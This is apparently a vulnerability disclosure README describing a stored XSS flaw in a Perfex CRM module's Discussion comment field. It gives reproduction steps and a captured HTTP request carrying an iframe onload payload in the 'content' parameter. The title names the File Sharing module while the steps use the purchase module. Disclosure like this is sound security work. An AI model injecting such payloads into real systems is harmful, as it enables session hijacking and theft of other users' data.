# File-Sharing-module-for-Perfex-CRM-XSS

A Stored Cross-Site Scripting (XSS) vulnerability was discovered in the File Sharing module of Perfex CRM. The vulnerability exists in the `&content` parameter within the Discussion section. By injecting malicious scripts into this parameter, an attacker can store the script within the application. When the content is viewed by other users, the malicious script is executed in their browsers, potentially leading to the compromise of user data, session hijacking, or other malicious actions.

# Steps to Reproduce:
* Login to the Perfex CRM system with valid credentials.
* Navigate to the following endpoint: `/admin/purchase/purchase_order/`.
* Select any Purchase Order and click on the `Discussion` tab.
* Write any comment and click on `Add Comment`.
* Capture the request using a tool like Burp Suite.
* In the captured request, locate the `content` parameter, replace its value with a malicious payload, and forward the request.

```
POST /admin/purchase/add_comment HTTP/2
Host: localhost
Cookie: _ga=GA1.1.723218010.1723958795; csrf_cookie_name=54dd532b592d3e37eb00c83fea787332; sp_session=48fef5to7od8tvb21ak5q2i34dp9vq59; _ga_2TQZW5L3GV=GS1.1.1723972977.4.1.1723972986.0.0.0
Content-Length: 89
Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://perfexmodules.gtssolution.site
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://perfexmodules.gtssolution.site/admin/purchase/purchase_order/4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

csrf_token_name=54dd532b592d3e37eb00c83fea787332&content=<iframe/onload=confirm("XSS")>&rel_id=4&rel_type=pur_order
```
